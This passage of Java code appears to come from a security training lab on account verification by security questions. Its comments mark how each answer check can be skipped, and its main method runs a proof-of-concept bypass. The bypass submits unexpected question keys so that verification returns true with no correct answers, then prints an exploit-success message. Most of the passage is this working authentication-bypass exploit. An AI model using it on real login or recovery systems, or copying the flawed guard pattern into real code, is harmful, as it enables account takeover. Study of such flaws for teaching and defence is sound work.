    // Guard 2: Q0 answer — bypass: omit "secQuestion0" → containsKey=false → branch skipped
    if (submittedQuestions.containsKey("secQuestion0")
        && !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0")))
      return false;

    // Guard 3: Q1 answer — bypass: omit "secQuestion1" → containsKey=false → branch skipped
    if (submittedQuestions.containsKey("secQuestion1")
        && !submittedQuestions.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1")))
      return false;

    return true;  // ← FALL-THROUGH: authentication granted with zero correct answers
  }

  public static void main(String[] args) {
    AccountVerificationHelper helper = new AccountVerificationHelper();

    // ── THE BYPASS ───────────────────────────────────────────────────────────
    HashMap<String,String> bypass = new HashMap<>();
    bypass.put("secQuestion2", "anything");   // any value; key just needs "secQuestion" substring
    bypass.put("secQuestion3", "blah");       // ditto; 2 entries satisfies size check

    boolean cheat  = helper.didUserLikelylCheat(bypass);   // false → anti-cheat passes
    boolean result = helper.verifyAccount(verifyUserId, bypass); // true → AUTH GRANTED

    System.out.println("didUserLikelylCheat : " + cheat);   // false
    System.out.println("verifyAccount       : " + result);  // true  ← EXPLOIT SUCCESS
    System.out.println(result ? "[EXPLOIT SUCCESS] Authentication bypassed!" : "[FAIL]");
  }
}

